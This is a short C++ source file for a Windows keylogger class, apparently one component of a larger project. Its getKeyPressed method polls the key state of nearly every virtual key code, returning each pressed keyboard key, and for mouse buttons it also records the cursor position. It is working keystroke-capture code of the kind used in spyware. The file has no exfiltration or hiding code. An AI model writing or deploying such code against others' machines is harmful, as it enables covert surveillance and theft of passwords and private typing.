#include "Keylogger.hh"

Keylogger::Keylogger()
{
}

Keylogger::~Keylogger()
{
}

Keylog					Keylogger::getKeyPressed()
{
	for (unsigned char i = 2; i < 255; i++)
	{
		char			rv = GetAsyncKeyState(i);
		if (rv & 1)
		{
			if (i == 2 || i == 4)
			{
				POINT	cursorCoords;

				GetCursorPos(&cursorCoords);
				return	Keylog(Keylog::MOUSE, i, (long) cursorCoords.x, (long) cursorCoords.y);
			}
			else
				return	Keylog(Keylog::KEYBOARD, i);
		}
	}
	return				Keylog();
}